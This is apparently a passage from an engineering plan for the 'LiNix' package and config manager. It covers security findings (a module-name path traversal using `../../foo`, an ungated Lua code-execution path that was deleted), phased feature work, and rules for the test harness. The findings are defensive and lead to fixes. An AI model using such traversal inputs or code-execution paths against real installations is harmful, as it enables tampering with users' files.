  where Windows produces it (`list` reads `SequenceNumber` as a number and drops a restore point
  that has none) and again where it is consumed (`sequence_number()` in `delete`/`restore`). **The
  binding property the ruling asked for holds — nothing but a `u32` reaches either interpolation —
  but "keep it typed through list/bisect/canary/undo" is not literally what the code does**, and a
  future reader looking for a `u32` on the struct will not find one. Tests:
  `a_restore_point_id_that_is_not_a_number_never_reaches_powershell`,
  `every_snapshot_label_is_a_fixed_string`.

- **SEC6 — Module name traversal via `--name` (low).** `layout.rs:102-103`: `module_file(name)` =
  `modules_dir().join(format!("{}.txt", name.to_lowercase()))`. `module add --name ../../foo` writes
  the remote-fetched body to `modules_dir()/../../foo.txt`, up out of `modules/`. Bounded: the forced
  `.txt` suffix defuses most sensitive targets, `refuse_overwrite` (`main.rs:1383`) blocks clobbering
  existing files, and `--name` is user-typed (the `github:`/URL default can't inject a `/`). Low
  severity. ~~**Solution TBD.**~~ **DECIDED 2026-07-19 (owner): a `ModuleName` newtype whose only
  constructor validates, and `module_file` takes that type instead of `&str`.** **BUILT 2026-07-19**
  — `ModuleName` lives in `model/layout.rs` beside the function that requires it; `module_file` takes
  `&ModuleName`, so the check cannot be lost at a call site. It lowercases once, at construction, so
  II.3's "the filename is the name, lowercased" happens in one place instead of at every join.
  `Target::Module` holds a `ModuleName` (validated in `Target::parse`, which already returned
  `Result`), `ModuleLoader::read` validates so a `use ../../foo` in a module file is a grammar error
  naming the file and line, and `ModuleName::literal` covers the three `Landing` names fixed in the
  source. `resolve.rs`'s set-math atom check now reads "is this a valid module name that is a file?"
  — a name that cannot be a module falls through to the package parse, which is where `(Work | jq)`
  was always meant to land. Tests: `a_module_name_cannot_climb_out_of_the_modules_folder`,
  `a_module_name_is_lowercased_once_at_construction`. SEC6 is SEC4-shaped,
  not SEC1-shaped — there is no legitimate module named `../../foo`, so there is **no config key and
  no opt-out**, and it lands early with SEC4 and SEC5.

  1. **The guard is the type, not the call site.** Eight callers reach `module_file`
     (`main.rs:1348`,`:1355`,`:1383`, `edit.rs:38`,`:574`, `modules.rs:40`, `resolve.rs:367`), and a
     guard on one of them is a guard on nothing. `module_file` returns a `PathBuf` and cannot fail,
     so validation cannot live inside it; it moves to the constructor, and every present and future
     caller has to pass through it. Same shape as SEC5's `id: u32` and `label` enum.
  2. **The rule is II.5's rule, spelled out:** non-empty, and after `to_lowercase()` only
     `[a-z0-9_-]`. That is stricter than "reject path separators" — it also rules out `.`, which
     kills `..` and the second extension in one stroke, rather than enumerating separators and
     hoping the list is complete.
  3. **The error teaches the rule**, per II.5: *"`../../foo` is not a module name — modules are
     lowercase letters, digits, `-` and `_`."*

  The `.txt` suffix, `refuse_overwrite` (`main.rs:1383`) and the separator-free URL-derived default
  are what make this low severity today. None of them is the guard; all three are accidents of the
  current call sites, and the newtype is what stops the next call site from losing them.

- **SEC7 — DONE, 2026-07-17.** `LuaHooks::render_template` deleted (and the now-unused `regex::Regex`
  import). Verified zero callers first — the only `.render_template(` in the tree is the link
  backend's Tera renderer. `cargo check --lib`/`--bin` clean, no warnings. *(Original finding:)*
  **Delete the dead, ungated Lua code-exec path (`LuaHooks::render_template`).** `hooks.rs:220`
  evaluates arbitrary `{{ … }}` as **Lua** with no approval-ledger check, and `setup_lua_sandbox`
  leaves `os`/`io`/`os.execute` intact — full code execution. The only `.render_template(` caller in
  the tree is `link.rs:271`, which resolves to the link backend's **Tera** renderer (`link.rs:94`,
  safe); nothing calls the Lua one. It is dead today but a loaded gun: wire it to file content and it
  is ungated RCE. Unlike SEC1–SEC6 this is not solution-TBD — per NO-LEGACY it is a straight **delete**
  (Tera is the live renderer). Remove `LuaHooks::render_template` (and any Lua-eval-for-templating
  scaffolding that exists only to serve it). The hook-execution path — Lua/Rhai/`#!` hooks gated by
  the II.12 ledger — is a separate, correct feature and stays.

## Phase 6 — The five containers

`DISTROS="ubuntu fedora arch alpine tools" ./docker/integration/run.sh jq`

Owed from the last sprint; not run since Stage 2.

## Phase 7 — Extensibility, parity, and the rehearsal (approved 2026-07-23)

**Parts XI–XIII are a plan, not a record.** The owner's instruction on the day they were written
was that the point is not what the document says but what gets built, so the approved items are
listed here, in Part III, where the work lives — and each carries the one command that shows it
is done.

**The theme is that LiNix stops being a fixed set of things it knows how to do.** Three axes of
extension already half-exist and are finished here: conditions are user-programmable (Part IX's
providers — built), backends are user-programmable (the onboarder — built but marooned on one
machine), and actions become user-programmable (`exec:` — not built). With all three, a user
adds a capability LiNix has never heard of without touching the binary. That is the whole of
this phase's ambition, and two of the three legs are already standing.

**Order is by dependency and by blast radius, not by size.**

**7a — Custom backends move into the config repo, and gain a separate `binary` (XIII.2, XIII.12,
U1, U2, U16).** Two changes to one file, done together because they touch the same loader and
the same trust question. The definition travels with the config or the config is not portable;
and `name` stops being forced to equal the executable, which turns the onboarder from "teach
LiNix a package manager" into "teach LiNix a noun". A definition in a shared repo is argv a
shared repo can execute, so it inherits II.12's hook model rather than getting its own.
**Exit:** a repo carrying a `[[backend]]` definition resolves and installs that backend's
package **on a machine that has never seen the file**; a definition whose `name` and `binary`
differ (`firewall` → `ufw`) installs, lists and removes; and the machine-local path is gone from
the tree (`grep -rn "custom_backends" src/` finds one loader, not two).

**DONE 2026-07-23.** All three exit clauses are asserted by unit tests, and the grep finds one
loader. **What the exit does not say and the work required:** the definition is approved through
the hook ledger before it registers, so "a machine that has never seen the file" means clone →
`linix lock` → `sync`, exactly as a repo carrying hooks does. **One ledger identity for the whole
file**, because a per-definition identity would let an added `[[backend]]` — the whole attack —
pass unnoticed. The check is at load rather than at the sync gate: a registered backend is
reachable from `search` and `list`, which no sync guards.

**The `name`/`binary` split went through `ManagerConfig`, not just the onboarder**, so there is
one answer to "what program does this backend run" and the built-ins are the `binary: None` case
of it rather than a second rule. Every command position in `generic.rs` asks
`GenericBackendCore::binary()` now; the label positions (the `backend` field on a parsed package,
the choco/scoop/winget identity check) still ask `name`, which is the distinction the split
exists to make. **U16 is refused, not decided**: a `binary` naming a path is skipped with a
message, because allowing it later is additive and allowing it now answers an open question in
code.

**7b — `exec:`, conditioned by `when`, locked by content hash (XIII.3).** No `@unless=`, no
`@creates=` — the condition is a `when` over a provider variable, and the state is
`locks/exec.toml` keyed by the hash of the script with a run count. **Exit:** a script runs once,
does not run on the next sync, runs again after one byte of it changes, and `plan` prints the
hash, the count and the decision before any of it happens.

**DONE 2026-07-24. Every clause of the exit was driven against the real binary**, not only the
suite: `plan` printed `sha256:f7cba99726d4 — will run`; the sync ran it and wrote count 1; the
next sync printed *"already run 1 time(s), ceiling 1; will not run"*; one byte changed the hash
and it ran again, leaving two rows of count 1.

**One rule the entry did not name, and it is not optional: `exec:` goes through II.12's approval
ledger.** II.12 says *"hash everything, including your own scripts — one rule, no exceptions"*
and *"the ledger is the only thing between a pulled config and a shell"*; an `exec:` line is
literally a shell from a pulled config, so it is approved by `linix lock` or it does not run, and
**`-y` cannot approve** (verified: `sync -y` on an unapproved script exits with the refusal).
The two ledgers answer different questions and are keyed differently on purpose — `locks/hooks.toml`
by declared path (*is this allowed to run?*), `locks/exec.toml` by content (*has this already
run?*). A script edited after approval is therefore both unapproved and un-run, which is the pair
you want.

**Deliberately not built, and why:** `@undo=` and dropping the lock row when a line is deleted.
Both are **U3**, still open. The row is *never* dropped, which is the safe direction — the
expensive bug XIII.3 warns about is a dropped row making a flapping condition re-run the script,
whereas a row left behind for a deleted line is an unused entry that does nothing. An orphan-row
GC needs the resolver to report `when`-false exec hashes so it can tell "condition off" from
"line deleted", and that distinction is exactly what U3 governs.

**`exec:` is excluded from the extras teardown by name** (`extra_key` returns `None`), with a
test asserting it: wiring a verb into a ledger built for nouns is how the un-enrol bug gets in
through the back door.

**7c — Backend bootstrap (XIII.9, U10).** The declared-and-missing manager is obtainable, by
asking first and then doing it. **Exit:** on a machine with no Homebrew, a config declaring
`brew:` explains what it would run, and — on yes — the next sync installs the package.

**7d — `sync --locked` (XIII.10, U11).** **Exit:** a machine whose index has moved on fails with
the package, the locked version and the offered one, and changes nothing.

**7e — `setting:` works everywhere, not on one desktop (XIII.4, U5, K7, K17, P7).** Ruled
2026-07-23: **`gsettings` is a stage, not the answer**, and the only adapter that exists is the
one store the owner does not run. `setting:` adapts to whatever the machine is actually running —
the list below is a priority order, not the set.

**K17 ruled 2026-07-23: adapters are a table, and the built-ins are rows in it.** Adding a store
is a plugin, not a LiNix release. `gsettings` stops being special and goes through the same path,
because an adapter mechanism the built-ins bypass is one nobody has tested. **That work precedes
every adapter below** — the second adapter is where the shape sets, and four hard-coded arms
nobody can extend is the shape this ruling exists to prevent.

1. **Windows registry.** `HKCU` or `HKLM` is **U19**, still open, and it must be answered before
   the first line — whatever this picks becomes the convention macOS `defaults` inherits.
2. **KDE** — `kreadconfig`/`kwriteconfig`. Ini files with no schema, so *reading the current
   value* is the hard half, and it is the half X.4 requires.
3. **COSMIC** — the file tree under `~/.config/cosmic/`, one file per key.
4. **Hyprland — decide whether it is a `setting:` at all.** Its truth is a text config file, not
   a key-value store, and `hyprctl getoption` reports a runtime value that can disagree with it.
   A `setting:` line there means LiNix owning individual lines inside a file it did not write,
   which no other adapter does and which `link:` already covers at whole-file granularity.

**A store with no adapter stays a named error, never a silent skip.** That refusal is what lets
these land one at a time.

**Exit:** a `setting:` line sets a value in a store LiNix does not have compiled-in support for,
a second sync is a no-op, and removing the line restores the default — the same three proofs the
gsettings adapter passed, on a store nobody shipped an enum arm for.

**7f — Health-checked upgrades (XIII.5, U7). DONE 2026-07-24.** `@health=` on a line and a
`health` list in `preferences.toml`, one revert path; a declared check with no snapshot provider
refuses before the change (V.65). The dead `@check=` branch was deleted with it. **Exit:** an upgrade whose `@health=` command
fails restores the snapshot, and says so in those words; with no snapshot provider it fails
loudly and says it cannot revert, before it starts.

**7g — The kernel/DKMS rebuild (XIII.1). BUILT 2026-07-24, pending verification on a machine
with real DKMS modules.** A sync that changes a kernel-shaped package runs `dkms autoinstall`
and fails when a module is left short of `installed`. LiNix builds nothing — it drives DKMS,
which the distribution's own hook only fires for the distribution's own manager. **Exit:** a sync that changes a kernel package
rebuilds the declared out-of-tree modules and fails loudly on a module that will not build —
before the reboot.

**7h — `linix try` (XIII.11, U12). DONE 2026-07-24.** Reuses the Phase 6 images; the config is
mounted read-only and the container is `--rm`. No runtime is a refusal naming both, verified on
the real binary at exit 3. **Exit:** a config with a deliberate error is rejected by
`try` on a clean container, having touched nothing on the host; with no container runtime, `try`
refuses and names what is missing rather than running anywhere.

**7i — The ten status commands become one (XIII.8, U9). DONE 2026-07-24.** Six commands folded
into `linix check` with seven sections; the exit grep is silent and `heal` survives. `doctor
--fix`'s three repairs moved to `heal` on the owner's ruling — that is the dividing line the
whole collapse rests on: **check looks, heal acts**.

Originally scheduled last, because it breaks invocations
and because everything above adds to what it must report. **Exit:** `linix check` covers drift,
unmanaged, absent, conflicts, health and policy, and `grep -rn "Commands::\(Status\|Doctor\|
Unmanaged\|Absent\|Conflicts\|Insight\|Metrics\|Audit\)" src/` is silent. **`heal` survives —
it acts, the rest only look.**

**7j — LiNix-level event hooks (XIII.13, U15). DONE 2026-07-24.** `after_sync`, `on_drift`,
`on_guard_refusal`, from `hooks/<event>` **and** `preferences.toml`, additively, each approved
separately through II.12's ledger. **Exit:** a sync that finds drift runs the
declared `on_drift` hook with the drift on stdin as JSON; a hook that exits non-zero warns and
does not fail the sync; and an undeclared event costs nothing.

**7k — `linix eval` (XIII.15, U17). DONE 2026-07-24.** Versioned JSON, no locks, repo-relative
sources so two machines diff cleanly. **Exit:** the resolved desired state prints as versioned JSON, with every
`when` decided and every bare name resolved, and the command takes no locks and changes nothing.

**7l — `git blame` for a declaration (XIII.19). DONE 2026-07-24.** `why` names the commit that
introduced the line, from git's pickaxe (`-S`), limited to the declaration files. Nothing is
written to support it. **Exit:** asking about a declared package names
the commit that introduced it, its date and its message, and the implementation reads git —
`grep` finds no new store written at sync time to support it.

**7m — The exit-code table (XIII.20, U21).** Not a feature; a decision applied everywhere at
once. **Exit:** 0/1/2/3 mean the same thing in every command that can produce them, a guard
refusal is 3 and nothing else is, and the table is in the readme.

**Decided before 7e, not during it: user-or-system scope (XIII.17, U19).** The registry adapter
cannot be written without an answer — `HKCU` and `HKLM` are a choice with no safe default — and
whatever it picks becomes the convention for macOS `defaults` too.

**Not in this phase, and deliberately: sharing (XIII.14).** It is blocked on **U14**, the
question of what makes a vendored module safe to run once `exec:` exists. Building the
convenient half first is how this ends badly.

**7o — `firewall:` (Part XI, N1–N3 ruled 2026-07-23).** Approved to build, and it rides K17's
adapter table rather than being five Rust backends — so it comes after that work, not before.
Windows Defender Firewall and one Linux adapter (`ufw` or `firewalld`) are the first set; P7
means Windows is not a later phase.

**The session-port refusal is not a feature of this item, it is its precondition.** LiNix detects
the port carrying the controlling connection and refuses any plan that would deny it — on every
path that can close a port, which N1's ruling means includes `purge-unmanaged` and an unattended
`watch` tick, **the more dangerous of the two, because nobody is there to read the refusal.**
Building the backend before this check is building the lockout.

**Exit:** one config opens the same port on a Windows box and a Linux box from one line; a rule
changed out of band is reported by name rather than by file; a plan that would close the port
carrying the session is refused naming the port and the rule, from `sync`, from
`purge-unmanaged`, and from a `watch` tick.

**7n — the dotfiles directory (XIII.21, U22–U25).** **Exit:** a file added under the dotfiles
tree appears at its mirrored destination after one `sync` with no line written anywhere, a file
deleted from the tree has its link removed by the same `extras_lock` teardown every other extra
uses, and a destination LiNix did not create is refused by name rather than replaced.

**The three decrypt-mode defects — ALL FIXED 2026-07-23, with T6's ruled half, and the fix
found a data-loss defect none of them named.**

**The teardown was handed the declaration's source.** `extra_key` keyed a `link:` by its source
path, so undoing one deleted the file in the user's own dotfiles repo and left the deployed copy
in place — exactly backwards, and the S1 family again (deleting a user's file by name). A link is
keyed by its **destination** now, which also makes an edited `@target=` undo the old destination
instead of orphaning it forever. Found by reading the removal path while implementing T6, not by
a test: no test called the undo.

Each exit below is met; what the entries did not say is recorded with them in VI.2.

**The three decrypt-mode defects, all ruled 2026-07-23, all live in shipped code (VI.2):**

- **T1 — decrypt mode never backs up.** `apply_managed_content` must not call `backup_once` when
  `@decrypt` is set. **The recorded reason for T1 was wrong and the real one is worse:** the copy
  preserves the original's permission bits (`link.rs:203`), and `*.linix-backup` *is* in the
  repo's gitignore (`core/git.rs:169`) — but **nothing ever deletes the backup.** `remove`
  (`link.rs:369`) drops the target and leaves it, and `backup_once` will not overwrite it, so a
  credential's predecessor outlives the declaration permanently. **Exit:** a decrypt line whose
  target already exists writes no `.linix-backup`, and a test asserts the absence by path.
- **T2 — a `@target=` inside the config root is refused when `@decrypt` is set.** **Exit:** the
  line errors naming both paths before anything is written; the same target without `@decrypt`
  still works.
- **T5 — the plaintext is created restricted, not chmod'd after.** On Windows it gets an ACL, or
  the documentation says plainly that it gets no protection there. **Exit:** no window exists in
  which the file is readable and not yet restricted; the Windows behaviour is stated somewhere a
  user reads, whichever way it goes.

**T6 blocks none of these and should be settled before the first one lands** — if removing a
declaration restores its backup, T1's fix is smaller than it looks.

**Owed by the rulings of 2026-07-23, small and each independent of a phase:**

- ~~**The unattended-refusal set becomes a `[guard]` list (K13, reversed and generalised).**~~
  **DONE 2026-07-23.** `[guard] never_unattended`, defaulted to `["rebuild",
  "purge-unmanaged"]`; the constant is deleted; the list is threaded into `schedule_config` as an
  argument, so `preferences.toml` is its one home and the check needs no config on disk to test.
  All three exit clauses are asserted, plus two the wording implies: the refusal quotes the key
  *and its current contents*, and an empty list refuses nothing. The template and
  `examples/preferences.toml` both carry the key.
- ~~**`setting:` adapters become a table, and the built-ins become rows in it (K17).**~~ **DONE
  2026-07-23.** Both exit clauses are tested: a `kwriteconfig6` store nobody shipped an enum arm
  for is driven from a row, and `gsettings` is a row in `setting_stores.toml` parsed by that same
  loader. User rows live in `custom_backends.toml`, so the adapter inherits 7a's approval instead
  of getting a second ledger entry for the same question — one `read_approved_definitions`, two
  readers. A row missing `read` or `reset` is refused rather than half-used: without a read it is
  a command that runs every sync, and without a reset removing the line would silently do
  nothing. **7e can now land one adapter at a time**, and the Windows registry is still gated on
  U19 (`HKCU` or `HKLM`), which nothing here answers.
- ~~**Two tags for one version is an error (D1).**~~ **ALREADY DONE — verified 2026-07-23, no
  code changed.** `one_release` has raised an error naming both tags since `8a63c80`
  (2026-07-20), with a test for each half of the exit condition. The register said it was
  missing; the register was three days stale.
- ~~**Format recognition is checked against real releases (D2).**~~ **DONE 2026-07-23, and it
  found two live defects** — both exactly the quiet kind the entry predicted. `MD5SUMS` (in every
  rclone release) was an executable candidate on every platform because the code read "matched
  this machine" as "did not contradict it"; `jq-linux64` (in jq's release) named no OS because
  the token matcher would not end a word on digits, so on Windows it too was an executable
  candidate. Both are fixed and both are pinned by name in the fixture. Six real releases, three
  platforms, every answer verified by hand and then **asserted** — `src/backends/artifact/real_releases.txt`
  is a check that can fail, not an inspection that happened once.

  **The finding it surfaced was ruled and fixed 2026-07-24.** The selector chose jq's and
  rclone's **source tarball** over a binary naming the exact machine, because the tie-break
  ranked format order above specificity even for a *detected* order. Ruled: a detected order
  yields to the machine (specificity leads), a `@formats=` the user wrote still wins outright
  (rank leads). `zip` was added to the macOS default order in the same change. The fixture's
  expectations are now the file a human would pick on every row, and both halves have unit
  tests naming the case.
- ~~**A test that `rebuild` writes no git commit (K14).**~~ **WRITTEN, NEVER RUN — verified
  2026-07-23.** It is section 12 of `docker/integration/run-in-container.sh`, and it is the
  honest shape the entry asked for: a real apt package is really removed and reinstalled, and
  **git is asked directly** (`git rev-list --count HEAD`) rather than through `linix git log`, so
  a rebuild that committed by some other route would still be caught. It also guards the two ways
  the check could pass vacuously — it requires a commit to exist first, and asserts the package
  came back. **What is owed is not the test, it is a run**: no container runtime exists on the
  development machine (Phase 6), and running it against the WSL install would install and remove
  real packages on a machine that is not disposable.

### S24 — what reading the code established, so it is not rediscovered

Established 2026-07-23 by reading the tree, before any fix. **No code was changed.**

- **The site is `src/app/sync/mod.rs:432`**, `let _ = handler.remove(…)` in the `is_install`
  branch. **The comment above it at `:404-408` argues for the bug in the document's own voice** —
  *"the remove-before-reinstall of the install path is not a removal of intent — the same package
  is reinstalled next — so it is not guarded here."* It is wrong twice: the package is not
  reinstalled next if the install fails, and *intent* was never the test. **That comment is
  deleted with the line it defends**, or it will justify the next one.
- **`watch` needs no separate fix.** Both `sync` and `watch` reach `heal()` through
  `reconcile()` (`main.rs:474`), which is already one function — the comment there records that
  `watch`'s copy used to drift and was merged for exactly this reason. One fix, both paths.
- **The `let _ =`-around-a-removal family is seven sites, and six are not this bug.**
  `appimage.rs:137` deletes a file LiNix downloaded a moment earlier that failed its checksum —
  LiNix's own artifact, and the discard is deliberate so the verification error survives.
  `datalock.rs:84` and `journal.rs:286` remove LiNix's own lock and journal. `scheduler/mod.rs`
  `:187`, `:188` and `:333` remove generated timer, service and plist files — **not this class,
  but they do swallow a failed removal silently**, which is the fail-loud rule and belongs in
  its own entry rather than being fixed under cover of this one.
- **A test pins the bug as correct behaviour, and it is green.**
  `tests/critical_paths_tests.rs:186`, `test_journal_self_healing_logic`, is documented as
  verifying that healing *"correctly uninstalls and re-attempts"* and primes the mock with
  `brew uninstall stale-pkg`. **The suite was not silent about this path — it asserted it.**
  That test changes with the fix, and the change is part of the fix, not cleanup after it.
- **`MockExecutor::get_calls()` already exists** (`core/executor.rs:275`), so the honest test is
  available without new infrastructure: heal an interrupted `Install` and assert **no** uninstall
  command was issued. Extend to the sibling cases in the same test — an interrupted *removal*
  still removes, and a protected package's interrupted removal is still refused by the guard —
  so a fix cannot restore one branch by breaking another.
- **The per-backend remove-before-install capability is not needed to land this.** No backend
  declares it and none is known to need it; building an unused second path now would be a
  capability with no caller and no test. It is written in II.10 as the rule for when one appears.

**The build order, ruled 2026-07-23.** S24 and S25 first — VI.0 already says nothing else should
be built before them, and they are one code path seen twice. Then S26/S27, because they are what
stands between anyone and finding the next S24 on a real machine. Then the ruled work above, in
the order it appears. **K17's adapter table precedes 7e, and 7e precedes 7o.**

**Four found on 2026-07-23 that gate real-machine testing (VI.2):** **S24** (recovering an
interrupted install uninstalls the package first, past the guard) is the one that removed
something on a live host and belongs in Phase 3 with the rest of the guard work; **S25**
(`--dry-run` mutates and takes no lock) is the same code path seen from the preview side and
must be fixed with it. **S26**/**S27** (the hour-long rate-limit sleep, and a lock that waits
two minutes for it) are Phase 5, and until they are fixed every long integration run on a real
box holds the data directory hostage.

---


# Part IV — Verification

**The specific proofs, on the ubuntu image:**
- After `adopt`, the registry holds ~103 packages, not ~579, and does **not** contain
  `libperl5.38t64`.
- `python3` is still installed at the end of the run.
- A large removal is refused without `--allow-mass-removal`.
- `purge-unmanaged` with an unadopted machine is refused by the ratio check.

**Grammar:** a test for every error in Part II.2. Each must produce an error, not a guess.

**Resolution:** two modules declaring the same package differently → error naming both files.

**Guard:** one test per removal path in Phase 3.

**Hooks:** a changed script hash refuses under `-y`.

## IV.1 What a check has to be (V.57)

**Every proof above is a proof against a machine, not against a mock.** Each of the four named
ubuntu proofs is an assertion with a number or a name in it — the adopted count is *compared*,
not printed; the mass-removal refusal and the `purge-unmanaged` ratio each run in the state that
makes them meaningful (the ratio check on an **unadopted** machine, which means before `adopt`,
not after) and assert *which* rule refused, because a `nok` that accepts any non-zero exit
accepts a panic and an unknown flag just as happily.

**A check that cannot fail is worse than a missing check**, because a missing one is visible in
the count and a vacuous one reports as coverage. Three rules follow, and each exists because
this harness has broken all three:

- **Grep for something only the right answer contains.** `linix` matches the config path, the
  binary name and half the error messages; `linix:` matches a manifest line.
- **A negative assertion runs in a fresh `sh`.** The shell caches where it found a name and
  keeps answering after the file is deleted.
- **A toggle that is declared must be read.** `SMOKE_ONLY` was declared in three places and read
  in none; so was `FAST`. A run that quietly tests less than another and prints the same "OK" is
  the failure this harness exists to catch.

**A coverage audit closes the set.** The harness enumerates every `[READY]` backend from
`doctor` and every subcommand, and **hard-fails on any that no real lifecycle and no plan-smoke
touched** — outside a named exempt set. This is what makes a backend added next year fail the
audit until it is covered, and it is the only mechanism that can: a fixed list of checks cannot
notice what is missing from it.

**An image tests what it claims or drops the claim.** The `tools` image exists to give the
ecosystem managers — composer, opam, luarocks, nimble, cabal, stack, mix, helm, krew, pixi,
spack, go, dotnet, pub — a real install → list → remove against the real manager. Until it does,
it is the `ubuntu` image with a longer build, and saying otherwise in a Dockerfile header is the
same lie as a check that cannot fail.

## IV.2 Where it runs

**The hermetic gates and the fast half of the matrix run in CI, on every change.** `cargo build`,
`cargo test`, `cargo clippy -D warnings`, and the **ubuntu, alpine and arch** images. The slow
ones — `tools`, `gentoo` — run on manual dispatch, because a 40-minute image would make the gate
something people learn to skip.

**Verification that only ever ran by hand on one machine is a claim, not a gate.** Every green
number in Part VII was produced through WSL on the owner's box; nothing made those runs
repeatable and nothing would have noticed them going red. That is how a harness comes to declare
`FAST` in three places and read it in none for a whole session.

---

